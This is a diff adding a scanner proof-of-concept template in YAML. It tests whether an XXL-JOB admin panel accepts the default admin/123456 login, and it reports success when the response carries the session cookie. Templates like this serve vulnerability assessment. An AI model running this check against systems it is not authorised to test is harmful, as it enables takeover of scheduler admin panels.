@@ -1,0 +1,15 @@
+name: poc-yaml-xxljob-default-login
+rules:
+  - method: POST
+    path: /xxl-job-admin/login
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: userName=admin&password=123456
+    expression: |
+      response.status == 200 && response.content_type.icontains("json") && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b"\"msg\"") && "Set-Cookie" in response.headers && response.headers["Set-Cookie"].contains("XXL_JOB_LOGIN_IDENTITY")
+detail:
+  author: adysec/nuclei_poc
+  description: XXL-JOB default admin/123456 credential check
+  links:
+    - https://github.com/adysec/nuclei_poc
+    - https://github.com/xuxueli/xxl-job
